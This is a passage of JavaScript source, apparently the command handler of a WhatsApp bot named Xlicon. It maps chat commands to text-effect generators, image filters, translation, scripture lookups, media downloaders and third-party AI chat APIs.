            link =
              "https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html";
          if (/flamingtext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html";
          let dehe = await photooxy.photoOxy(link, q);
          XliconBotInc.sendMessage(
            m.chat,
            { image: { url: dehe }, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "glitchtext":
      case "writetext":
      case "advancedglow":
      case "typographytext":
      case "pixelglitch":
      case "neonglitch":
      case "flagtext":
      case "flag3dtext":
      case "deletingtext":
      case "blackpinkstyle":
      case "glowingtext":
      case "underwatertext":
      case "logomaker":
      case "cartoonstyle":
      case "papercutstyle":
      case "watercolortext":
      case "effectclouds":
      case "blackpinklogo":
      case "gradienttext":
      case "summerbeach":
      case "luxurygold":
      case "multicoloredneon":
      case "sandsummer":
      case "galaxywallpaper":
      case "1917style":
      case "makingneon":
      case "royaltext":
      case "freecreate":
      case "galaxystyle":
      case "lighteffects":
        {
          if (!q)
            return replygcXlicon(`Example : ${prefix + command} SalmanSer`);
          await XliconStickWait();
          let link;
          if (/glitchtext/.test(command))
            link =
              "https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html";
          if (/writetext/.test(command))
            link =
              "https://en.ephoto360.com/write-text-on-wet-glass-online-589.html";
          if (/advancedglow/.test(command))
            link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
          if (/typographytext/.test(command))
            link =
              "https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html";
          if (/pixelglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html";
          if (/neonglitch/.test(command))
            link =
              "https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html";
          if (/flagtext/.test(command))
            link =
              "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
          if (/flag3dtext/.test(command))
            link =
              "https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html";
          if (/deletingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html";
          if (/blackpinkstyle/.test(command))
            link =
              "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
          if (/glowingtext/.test(command))
            link =
              "https://en.ephoto360.com/create-glowing-text-effects-online-706.html";
          if (/underwatertext/.test(command))
            link =
              "https://en.ephoto360.com/3d-underwater-text-effect-online-682.html";
          if (/logomaker/.test(command))
            link =
              "https://en.ephoto360.com/free-bear-logo-maker-online-673.html";
          if (/cartoonstyle/.test(command))
            link =
              "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
          if (/papercutstyle/.test(command))
            link =
              "https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html";
          if (/watercolortext/.test(command))
            link =
              "https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html";
          if (/effectclouds/.test(command))
            link =
              "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
          if (/blackpinklogo/.test(command))
            link =
              "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
          if (/gradienttext/.test(command))
            link =
              "https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html";
          if (/summerbeach/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html";
          if (/luxurygold/.test(command))
            link =
              "https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html";
          if (/multicoloredneon/.test(command))
            link =
              "https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html";
          if (/sandsummer/.test(command))
            link =
              "https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html";
          if (/galaxywallpaper/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html";
          if (/1917style/.test(command))
            link = "https://en.ephoto360.com/1917-style-text-effect-523.html";
          if (/makingneon/.test(command))
            link =
              "https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html";
          if (/royaltext/.test(command))
            link =
              "https://en.ephoto360.com/royal-text-effect-online-free-471.html";
          if (/freecreate/.test(command))
            link =
              "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
          if (/galaxystyle/.test(command))
            link =
              "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
          if (/lighteffects/.test(command))
            link =
              "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
          let haldwhd = await ephoto(link, q);
          XliconBotInc.sendMessage(
            m.chat,
            { image: { url: haldwhd }, caption: `${mess.success}` },
            { quoted: m }
          );
        }
        break;
      case "setcmd":
        {
          if (!m.quoted) return replygcXlicon("Reply Message!");
          if (!m.quoted.fileSha256) return replygcXlicon("SHA256 Hash Missing");
          if (!text) return replygcXlicon(`For What Command?`);
          let hash = m.quoted.fileSha256.toString("base64");
          if (
            global.db.data.sticker[hash] &&
            global.db.data.sticker[hash].locked
          )
            return replygcXlicon(
              "You have no permission to change this sticker command"
            );
          global.db.data.sticker[hash] = {
            text,
            mentionedJid: m.mentionedJid,
            creator: m.sender,
            at: +new Date(),
            locked: false,
          };
          replygcXlicon(`Done!`);
        }
        break;
      case "delcmd":
        {
          let hash = m.quoted.fileSha256.toString("base64");
          if (!hash) return replygcXlicon(`No hashes`);
          if (
            global.db.data.sticker[hash] &&
            global.db.data.sticker[hash].locked
          )
            return replygcXlicon(
              "You have no permission to delete this sticker command"
            );
          delete global.db.data.sticker[hash];
          replygcXlicon(`Done!`);
        }
        break;
      case "listcmd":
        {
          let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker)
  .map(
    ([key, value], index) =>
      `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`
  )
  .join("\n")}
`.trim();
          XliconBotInc.sendText(m.chat, teks, m, {
            mentions: Object.values(global.db.data.sticker)
              .map((x) => x.mentionedJid)
              .reduce((a, b) => [...a, ...b], []),
          });
        }
        break;
      case "lockcmd":
        {
          if (!XeonTheCreator) return XliconStickOwner();
          if (!m.quoted) return replygcXlicon("Reply Message!");
          if (!m.quoted.fileSha256) return replygcXlicon("SHA256 Hash Missing");
          let hash = m.quoted.fileSha256.toString("base64");
          if (!(hash in global.db.data.sticker))
            return replygcXlicon("Hash not found in database");
          global.db.data.sticker[hash].locked = !/^un/i.test(command);
          replygcXlicon("Done!");
        }
        break;
      case "ss":
      case "ssweb":
        {
          if (!q) return replygcXlicon(`Example ${prefix + command} link`);
          await XliconStickWait();
          let krt = await scp2.ssweb(q);
          XliconBotInc.sendMessage(
            from,
            { image: krt.result, caption: mess.succes },
            { quoted: m }
          );
        }
        break;
      case "pickupline":
        {
          try {
            let res = await fetch(`https://api.popcat.xyz/pickuplines`);
            if (!res.ok) {
              throw new Error(`API request failed with status ${res.status}`);
            }
            let json = await res.json();
            let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`;
            replygcXlicon(pickupLine);
          } catch (error) {
            console.error(error);
            // Handle the error appropriately
          }
        }
        break;
      case "animequote":
        {
          try {
            const res = await fetch("https://some-random-api.com/animu/quote");
            if (!res.ok) throw await res.text();
            const json = await res.json();
            const { sentence, character, anime } = json;
            const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`;
            XliconBotInc.sendMessage(
              m.chat,
              { text: message },
              "extendedTextMessage",
              { quoted: m }
            );
          } catch (error) {
            console.error(error);
          }
        }
        break;
      case "bible":
        {
          const { translate } = require("@vitalets/google-translate-api");
          const BASE_URL = "https://bible-api.com";
          try {
            // Extract the chapter number or name from the command text.
            let chapterInput = m.text.split(" ").slice(1).join("").trim();
            if (!chapterInput) {
              throw new Error(
                `Please specify the chapter number or name. Example: ${
                  prefix + command
                } john 3:16`
              );
            }
            // Encode the chapterInput to handle special characters
            chapterInput = encodeURIComponent(chapterInput);
            // Make an API request to fetch the chapter information.
            let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
            if (!chapterRes.ok) {
              throw new Error(
                `Please specify the chapter number or name. Example: ${
                  prefix + command
                } john 3:16`
              );
            }
            let chapterData = await chapterRes.json();
            let translatedChapterHindi = await translate(chapterData.text, {
              to: "hi",
              autoCorrect: true,
            });
            let translatedChapterEnglish = await translate(chapterData.text, {
              to: "en",
              autoCorrect: true,
            });
            let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`;
            replygcXlicon(bibleChapter);
          } catch (error) {
            replygcXlicon(`Error: ${error.message}`);
          }
        }
        break;

      case "dalle":
        {
          if (!text)
            return replygcXlicon(
              `*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${
                prefix + command
              } Beautiful anime girl*\n*${prefix + command} girl in pink dress*`
            );
          try {
            replygcXlicon("*Please wait, generating image...*");
            const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(
              text
            )}`;
            const response = await fetch(endpoint);
            if (response.ok) {
              const imageBuffer = await response.buffer();
              await XliconBotInc.sendMessage(
                m.chat,
                { image: imageBuffer },
                { quoted: m }
              );
            } else {
              throw "*Image generation failed*";
            }
          } catch {
            replygcXlicon(
              "*Oops! Something went wrong while generating images. Please try again later.*"
            );
          }
        }
        break;

      case "translate":
        {
          if (!q)
            return replygcXlicon(
              `*Where is the text*\n\n*𝙴xample usage*\n*${
                prefix + command
              } <language id> <text>*\n*${prefix + command} ja yo wassup*`
            );
          const defaultLang = "en";
          const tld = "cn";
          let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim();
          let lang = args[0];
          let text = args.slice(1).join(" ");
          if ((args[0] || "").length !== 2) {
            lang = defaultLang;
            text = args.join(" ");
          }
          if (!text && m.quoted && m.quoted.text) text = m.quoted.text;
          try {
            let result = await translate(text, {
              to: lang,
              autoCorrect: true,
            }).catch((_) => null);
            replygcXlicon(result.text);
          } catch (e) {
            return replygcXlicon(err);
          }
        }
        break;
      case "quran":
        {
          try {
            // Extract the surah number or name from the command text.
            let surahInput = m.text.split(" ")[1];
            if (!surahInput) {
              throw new Error(`Please specify the surah number or name`);
            }
            let surahListRes = await fetch(
              "https://quran-endpoint.vercel.app/quran"
            );
            let surahList = await surahListRes.json();
            let surahData = surahList.data.find(
              (surah) =>
                surah.number === Number(surahInput) ||
                surah.asma.ar.short.toLowerCase() ===
                  surahInput.toLowerCase() ||
                surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
            );
            if (!surahData) {
              throw new Error(
                `Couldn't find surah with number or name "${surahInput}"`
              );
            }
            let res = await fetch(
              `https://quran-endpoint.vercel.app/quran/${surahData.number}`
            );
            if (!res.ok) {
              let error = await res.json();
              throw new Error(
                `API request failed with status ${res.status} and message ${error.message}`
              );
            }

            let json = await res.json();

            // Translate tafsir from Bahasa Indonesia to Urdu
            let translatedTafsirUrdu = await translate(json.data.tafsir.id, {
              to: "ur",
              autoCorrect: true,
            });

            // Translate tafsir from Bahasa Indonesia to English
            let translatedTafsirEnglish = await translate(json.data.tafsir.id, {
              to: "en",
              autoCorrect: true,
            });

            let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`;

            replygcXlicon(quranSurah);

            if (json.data.recitation.full) {
              XliconBotInc.sendMessage(
                m.chat,
                {
                  audio: { url: json.data.recitation.full },
                  mimetype: "audio/mp4",
                  ptt: true,
                  fileName: `recitation.mp3`,
                },
                { quoted: m }
              );
            }
          } catch (error) {
            replygcXlicon(`Error: ${error.message}`);
          }
        }
        break;
      case "mediafire":
        {
          if (!args[0])
            return replygcXlicon(
              `Enter the mediafire link next to the command`
            );
          if (!args[0].match(/mediafire/gi))
            return replygcXlicon(`Link incorrect`);
          const { mediafiredl } = require("@bochilteam/scraper");
          let full = /f$/i.test(command);
          let u = /https?:\/\//.test(args[0]) ? args[0] : "https://" + args[0];
          let res = await mediafiredl(args[0]);
          let { url, url2, filename, ext, aploud, filesize, filesizeH } = res;
          let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim();
          XliconBotInc.sendMessage(
            m.chat,
            { document: { url: url }, fileName: filename, mimetype: ext },
            { quoted: m }
          );
        }
        break;
      case "tagadmin":
      case "listadmin":
      case "admin":
        {
          if (!m.isGroup) return XeonStickGroup();
          const groupAdmins = participants.filter((p) => p.admin);
          const listAdmin = groupAdmins
            .map((v, i) => `${i + 1}. @${v.id.split("@")[0]}`)
            .join("\n");
          const owner =
            groupMetadata.owner ||
            groupAdmins.find((p) => p.admin === "superadmin")?.id ||
            m.chat.split`-`[0] + "@s.whatsapp.net";
          let text = `   
*Group Admins:*
${listAdmin}
`.trim();
          XliconBotInc.sendMessage(
            m.chat,
            { text: text, mentions: [...groupAdmins.map((v) => v.id), owner] },
            { quoted: m }
          );
        }
        break;
      case "instagram":
      case "igvideo":
      case "igimage":
      case "igvid":
      case "igimg":
      case "ig":
        {
          if (!text)
            return replygcXlicon(
              `You need to give the URL of Any Instagram video, post, reel, image`
            );
          let res;
          try {
            res = await fetch(
              `https://www.guruapi.tech/api/igdlv1?url=${text}`
            );
          } catch (error) {
            return replygcXlicon(`An error occurred: ${error.message}`);
          }
          let api_response = await res.json();
          if (!api_response || !api_response.data) {
            return replygcXlicon(
              `No video or image found or Invalid response from API.`
            );
          }
          const mediaArray = api_response.data;
          for (const mediaData of mediaArray) {
            const mediaType = mediaData.type;
            const mediaURL = mediaData.url_download;
            let cap = `HERE IS THE ${mediaType.toUpperCase()}`;
            if (mediaType === "video") {
              XliconBotInc.sendMessage(
                m.chat,
                { video: { url: mediaURL }, caption: cap },
                { quoted: m }
              );
            } else if (mediaType === "image") {
              XliconBotInc.sendMessage(
                m.chat,
                { image: { url: mediaURL }, caption: cap },
                { quoted: m }
              );
            }
          }
        }
        break;
      case "apk":
      case "apkdl":
        {
          if (!text) return replygcXlicon("What apk u wanna download?");
          let resxeon = await fetch(
            `https://api.maher-zubair.tech/download/apk?id=${text}`
          );
          let jsonxeon = await resxeon.json();
          if (jsonxeon.status == "200") {
            XliconBotInc.sendMessage(
              from,
              {
                document: { url: jsonxeon.result.dllink },
                fileName: jsonxeon.result.name,
                mimetype: "application/vnd.android.package-archive",
              },
              { quoted: m }
            );
          } else {
            return replygcXlicon(jsonxeon.err);
          }
        }
        break;
      case "mathsai":
      case "mathai":
        {
          if (!text) return replygcXlicon("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/mathssolve?q=${text}`
          );
          if (!d.result) {
            return replygcXlicon(
              "Failed to get response. Please try again later"
            );
          } else {
            replygcXlicon(d.result);
          }
        }
        break;

      case "blackboxai":
      case "bbai":
        {
          if (!text) return replygcXlicon("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/blackboxv4?q=${text}`
          );
          if (!d.result) {
            return replygcXlicon(
              "Failed to get response. Please try again later"
            );
          } else {
            replygcXlicon(d.result);
          }
        }
        break;
      case "bardai":
      case "bard":
        {
          if (!text) return replygcXlicon("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/bard?q=${text}`
          );
          if (!d.result) {
            return replygcXlicon(
              "Failed to get response. Please try again later"
            );
          } else {
            replygcXlicon(d.result);
          }
        }
        break;
      case "photoleapai":
        {
          if (!text) return replygcXlicon("What is your question?");
          let xeonfetch = await fetchJson(
            `https://api.maher-zubair.tech/ai/photoleap?q=${text}`
          );
          XliconBotInc.sendMessage(
            from,
            { image: { url: xeonfetch.result } },
            { quoted: m }
          );
        }
        break;
      case "lamaai":
        {
          if (!text) return replygcXlicon("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/llama-2?q=${text}`
          );
          if (!d.result) {
            return replygcXlicon(
              "Failed to get response. Please try again later"
            );
          } else {
            replygcXlicon(d.result);
          }
        }
        break;
      case "geminiai":
      case "gemini":
        {
          if (!text) return replygcXlicon("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/gemini?q=${text}`
          );
          if (!d.result) {
            return replygcXlicon(
              "Failed to get response. Please try again later"
            );
          } else {
            replygcXlicon(d.result);
          }
        }
        break;
      case "chatgpt":
      case "gpt":
        {
          if (!text) return replygcXlicon("What is your question?");
          let d = await fetchJson(
            `https://api.maher-zubair.tech/ai/chatgptv4?q=${text}`
          );
          if (!d.result) {
            return replygcXlicon(
              "Failed to get response. Please try again later"
            );
          } else {
            replygcXlicon(d.result);
          }
        }
        break;
      case "itunes":
        {
          if (!text) return replygcXlicon("Please provide a song name");
          try {
            let res = await fetch(
              `https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`
            );
            if (!res.ok) {
              throw new Error(`API request failed with status ${res.status}`);
            }
            let json = await res.json();
            console.log("JSON response:", json);
            let songInfo = `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`;
            // Check if thumbnail is present, then send it with songInfo as caption
            if (json.thumbnail) {
              await XliconBotInc.sendMessage(
                m.chat,
                { image: { url: json.thumbnail }, caption: songInfo },
                { quoted: m }
              );
            } else {
              replygcXlicon(songInfo);
            }
          } catch (error) {
            console.error(error);
            // Handle the error appropriately
          }
        }
        break;

      // ALL MAKER CMDS ADDED BY SALMAN SER
      // < For ttp >

      case "ttp":
      case "textsticker":
        if (args.length == 0)
          return replygcXlicon(`Example: ${prefix + command} SalmanSer`);
        dgxeontks = args.join(" ");
        dgxeonvuff = await getBuffer(
          `https://api.maher-zubair.tech/maker/text2img?q=${dgxeontks}`
        );
        XliconBotInc.sendImageAsSticker(m.chat, dgxeonvuff, m, {
          packname: packname,
          author: author,
        });
        break;
      // < For attp >

      case "attp":
      case "textgif":
        if (args.length == 0)
          return replygcXlicon(`Example: ${prefix + command} SalmanSer`);
        dgxeontks2 = args.join(" ");
        dgxeonvuff2 = await getBuffer(
          `https://api.maher-zubair.tech/maker/text2gif?q=${dgxeontks2}`
        );
        XliconBotInc.sendImageAsSticker(m.chat, dgxeonvuff2, m, {
          packname: packname,
          author: author,
        });
        break;

      // ALL MAKER CMDS ADDED BY SALMAN SER
      // < For blur >

      case "blur":
      case "blurimg":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/blur?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For beautiful >

      case "beautiful":
      case "beautifulimg":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/beautiful?url${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For facepalm >

      case "facepalm":
      case "facepalmimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/facepalm?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For invert >

      case "invert":
      case "invertimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/invert?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For pixelate >

      case "pixelate":
      case "pixelateimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/pixelate?amount=50&url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For rainbow >

      case "rainbow":
      case "rainbowimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/rainbow?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For trigger >

      case "trigger":
      case "triggerimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: { url: `https://vihangayt.me/maker/trigger?url=${anu}` },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For wanted >

      case "wanted":
      case "wantedimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/trigger?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For wasted >

      case "wasted":
      case "wastedimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/wasted?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For carbon >

      case "carbon":
      case "carbonimage":
        {
          if (!text) return replygcXlicon("Where is the text?");
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: { url: `https://vihangayt.me/maker/carbonimg?q=${text}` },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For colorize >

      case "colorize":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: { url: `https://vihangayt.me/tools/colorize?url=${anu}` },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For Burn >

      case "burn":
      case "burnimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/burn?amount=5&url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For Sharpen >

      case "sharpen":
      case "sharpenimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/sharpen?amount=3&url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For Brightness >

      case "bright":
      case "brightimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/brightness?amount=50&url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For darkness >

      case "dark":
      case "darkimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/darkness?amount=50&url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For resize >

      case "resize":
      case "resizeimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/resize?height=500&width=500&url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For delete>

      case "delete":
      case "deleteimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/delete?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For jail>

      case "jail":
      case "jailimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/jail?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

      // < For joke>

      case "joke":
      case "jokeimage":
        {
          if (!isMedia) return replygcXlicon("Where Is The Image");
          let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          XliconBotInc.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api-smd-1.vercel.app/api/maker/jokeOverHead?url=${anu}`,
              },
              caption: "➫ 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐁𝐲 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑�",
            },
            { quoted: m }
          );
        }
        break;

